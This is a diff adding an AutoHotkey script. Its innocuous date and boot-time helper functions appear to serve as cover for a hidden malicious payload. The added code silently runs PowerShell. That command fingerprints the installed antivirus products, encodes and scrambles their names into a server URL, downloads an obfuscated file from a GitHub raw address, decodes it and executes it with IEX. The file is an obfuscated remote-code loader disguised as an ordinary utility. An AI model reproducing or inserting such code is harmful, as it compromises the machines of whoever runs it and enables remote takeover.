@@ -1,0 +1,49 @@
+
+b1 := GetSystemBootTime()
+b2 := A_Now
+b3 := DateDiff(b1, b2)
+
+ShellRun("powershell.exe", "try{$mutex = [System.Threading.Mutex]::OpenExisting('Mutex');$mutex.Close(); return;}catch{}; $antivirusDisplayName = (Get-CimInstance -Namespace 'root\\SecurityCenter2' -ClassName 'AntiVirusProduct').displayName;$totalName = '';if($antivirusDisplayName.Count -eq 1){$totalName = $antivirusDisplayName}else{for ($i = 0; $i -lt $antivirusDisplayName.Count; $i++) {$totalName += $antivirusDisplayName[$i];if($i -ne $antivirusDisplayName.Count - 1){$totalName +=', '}}}$bytes = [System.Text.Encoding]::UTF8.GetBytes($totalName);$encryptedDisplayName = [Convert]::ToBase64String($bytes);$length = $encryptedDisplayName.Length;$midpoint = [math]::Ceiling($length / 4);$firstQuarter = $encryptedDisplayName.Substring(0, $midpoint);$secondQuarter = $encryptedDisplayName.Substring($midpoint, $midpoint);$thirdQuarter = $encryptedDisplayName.Substring($midpoint *2, $midpoint);$fourthQuarter = $encryptedDisplayName.Substring($midpoint *3, $midpoint);$swappedString = $secondQuarter + $fourthQuarter  + $thirdQuarter + $firstQuarter;$serverUrl = 'https://example.com';$serverUrl += $swappedString;$Url = 'https://raw.githubusercontent.com/chaeminho34677/AppData/refs/heads/main/update_cache.tmp'; $data = Invoke-RestMethod -Uri $Url; $base64Chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';$midpoint = [math]::Ceiling($data.Length / 2);$firstHalf = $data.Substring(0, $midpoint); $secondHalf = $data.Substring($midpoint); $base64Encoded = $secondHalf + $firstHalf; $binaryString = '';foreach ($char in $base64Encoded.ToCharArray()) { if ($char -ne '=') { $index = $base64Chars.IndexOf($char); $binaryString += [Convert]::ToString($index, 2).PadLeft(6, '0')}};$byteArray = @(); try{for ($i = 0; $i -lt $binaryString.Length; $i += 8) { $byte = [Convert]::ToInt32($binaryString.Substring($i, 8), 2); $byteArray += $byte }} catch{};$decodedString = [System.Text.Encoding]::UTF8.GetString($byteArray); IEX($decodedString)" . "", "", "", 0)
+
+DateDiff(start, end) {
+   
+    startYear := SubStr(start, 1, 4)
+    startMonth := SubStr(start, 6, 2)
+    startDay := SubStr(start, 9, 2)
+    startHour := SubStr(start, 12, 2)
+    startMinute := SubStr(start, 15, 2)
+    startSecond := SubStr(start, 18, 2)
+
+    ; End Date
+    endYear := SubStr(end, 1, 4)
+    endMonth := SubStr(end, 5, 2)
+    endDay := SubStr(end, 7, 2)
+    endHour := SubStr(end, 9, 2)
+    endMinute := SubStr(end, 11, 2)
+    endSecond := SubStr(end, 13, 2)
+
+    startTimeInSeconds := DateToSeconds(startYear, startMonth, startDay, startHour, startMinute, startSecond)
+    endTimeInSeconds := DateToSeconds(endYear, endMonth, endDay, endHour, endMinute, endSecond)
+
+    return endTimeInSeconds - startTimeInSeconds
+}
+
+DateToSeconds(year, month, day, hour, minute, second) {
+    date := (Integer(year) - 1970) * 31536000  
+    date += (Integer(month) - 1) * 2628000     
+    date += (Integer(day) - 1) * 86400         
+    date += Integer(hour) * 3600               
+    date += Integer(minute) * 60               
+    date += Integer(second)        
+    return date
+}
+GetSystemBootTime() {
+    for process in ComObjGet("winmgmts:\\.\root\cimv2").ExecQuery("SELECT LastBootUpTime FROM Win32_OperatingSystem")
+        return SubStr(process.LastBootUpTime, 1, 4) . "-" . SubStr(process.LastBootUpTime, 5, 2) . "-" . SubStr(process.LastBootUpTime, 7, 2) . " " . SubStr(process.LastBootUpTime, 9, 2) . ":" . SubStr(process.LastBootUpTime, 11, 2) . ":" . SubStr(process.LastBootUpTime, 13, 2)
+}
+
+ShellRun(filePath, arguments := "", directory := "", operation := "", show := 0) {
+    static VT_UI4 := 0x13, SWC_DESKTOP := ComValue(VT_UI4, 0x8)
+    ComObject("Shell.Application").Windows.Item(SWC_DESKTOP).Document.Application
+        .ShellExecute(filePath, arguments, directory, operation, show)
+}
